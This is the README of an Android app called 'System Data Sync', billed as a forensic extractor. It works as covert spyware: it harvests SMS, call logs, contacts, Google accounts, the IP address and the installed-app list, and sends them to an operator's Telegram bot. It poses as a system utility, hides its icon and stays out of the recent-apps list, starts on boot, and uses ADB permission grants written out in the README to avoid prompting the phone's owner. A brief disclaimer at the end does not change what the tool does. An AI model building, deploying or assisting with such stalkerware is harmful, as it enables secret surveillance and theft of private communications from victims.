# System Data Sync (ForensicSMS Extractor)

A specialized Android application for comprehensive forensic data extraction and secure transmission to Telegram. Designed for authorized investigations, it operates covertly as a legitimate system utility.

## 🚀 Key Features

### 📂 Deep Data Extraction
*   **SMS Messages**: Complete extraction of Inbox, Sent, Drafts, and Outbox.
*   **Call Logs**: Detailed history including Incoming, Outgoing, and Missed calls.
*   **Contacts**: Full address book export (Names & Phone Numbers).
*   **Device Intelligence**:
    *   **Network**: Current IP Address.
    *   **Identity**: Logged-in Google Accounts (includes Demo Mode for testing).
    *   **Software**: Inventory of all installed applications and versions.

### 📤 Advanced Export & Transmission
*   **Secure Transport**: Transmits data via the encrypted Telegram Bot API.
*   **Flexible Output**:
    *   **ZIP Archives**: Compresses all JSON/CSV reports into a single `backup_TIMESTAMP.zip` for efficient transfer.
    *   **Excel Ready**: Exports Call Logs directly to `.csv` format.
    *   **Real-time Feed**: Option to forward SMS messages individually to the chat.

### 🛡️ Professional Stealth Operations
*   **Legitimate Disguise**: Appears as "System Data Sync" with a standard system icon.
*   **Launcher Stealth**: Option to completely hide the app icon from the App Drawer.
*   **Footprint Reduction**: Excluded from the "Recent Apps" (Multitasking) menu.
*   **Persistence**: Auto-starts on boot and runs periodic background synchronization.

---

## 🛠️ Setup & Deployment

### 1. Build & Install
```bash
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### 2. Grant Forensic Permissions (ADB)
For covert operation, grant permissions via ADB to avoid user prompts:

```bash
# Core Data Access
adb shell pm grant com.esurakhsh android.permission.READ_SMS
adb shell pm grant com.esurakhsh android.permission.READ_CONTACTS
adb shell pm grant com.esurakhsh android.permission.READ_CALL_LOG
adb shell pm grant com.esurakhsh android.permission.GET_ACCOUNTS

# Operational Permissions
adb shell pm grant com.esurakhsh android.permission.POST_NOTIFICATIONS
```

### 3. Configuration & Launch
1.  Launch the configuration interface (via ADB if icon is hidden):
    ```bash
    adb shell am start -n com.esurakhsh/.ConfigActivity
    ```
2.  **Authentication**: Input your Telegram **Bot Token** and **Chat ID**.
3.  **Export Settings**:
    *   [x] **Compress all Output to ZIP**: Best for bulk data extraction.
    *   [ ] **Send SMS individually**: For monitoring recent activity.
    *   [x] **Export Call Logs as CSV**: For spreadsheet analysis.
4.  **Stealth Controls**:
    *   Toggle **"Hide App Icon from Launcher"** for maximum covertness.
5.  Click **"Update Configuration & Start"**.

---

## 📊 Data Formats

The tool generates the following files (inside the ZIP archive):

*   `sms_{timestamp}.json`: Array of SMS objects (address, body, date, type).
*   `contacts_{timestamp}.json`: List of contacts (name, number).
*   `calls_{timestamp}.csv`: Call log history formatted for Excel.
*   `installed_apps_{timestamp}.json`: List of all packages and versions.
*   `device_info_{timestamp}.json`: IP address and Google Accounts.

---

## ⚠️ Legal Disclaimer
**This tool is strictly for authorized forensic investigations, security auditing, and educational purposes only.**

Unauthorized installation on devices you do not own or have explicit consent to monitor is a severe violation of privacy laws. The developers assume no liability for misuse. Ensure you have proper legal authority (e.g., a warrant or owner consent) before deployment.
